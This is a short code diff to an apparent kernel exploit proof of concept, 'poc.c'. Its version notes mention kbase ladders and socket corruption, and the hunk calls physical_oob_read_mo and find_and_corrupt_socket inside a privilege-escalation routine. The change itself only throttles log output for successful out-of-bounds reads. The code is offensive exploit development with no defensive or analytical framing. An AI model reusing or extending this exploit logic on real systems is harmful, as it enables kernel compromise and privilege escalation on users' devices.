@@ -1,5 +1,5 @@
 // poc.c
-// Lumina P007OpenOnly - 64788 KRW Focus V25
+// Lumina P007OpenOnly - 64788 KRW Focus V25.2 (log quieting)
 // V25: OG ClearSwordCore gates restored (w==-1 + Q0-only), per-page tags,
 // SO_NECP 0x1109, OG kbase ladder, cycler/churn removal
 // V44: Anonymous VM cycler (replaces IOSurface cycler), removed mlock
@@ -158,7 +158,13 @@ kern_return_t pe_v1(void) {
                 }
                 kr = physical_oob_read_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
                 if (kr == KERN_SUCCESS) {
-                    LOG("oob read success at offset %#llx", seeking_offset);
+                    // V25.2: per-win lines throttled — 3200+/run froze the UI
+                    // (fullfsync per line). The find_and_corrupt_socket
+                    // verdict line (every 128 windows) is the diagnostic.
+                    static uint64_t win_log_count = 0;
+                    if ((++win_log_count & 0x3F) == 1) {
+                        LOG("oob read success at offset %#llx (win#%llu)", seeking_offset, win_log_count);
+                    }
                     if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, &target_inp_gencnt_count, false) == KERN_SUCCESS) {
                         success = true;
                         break;
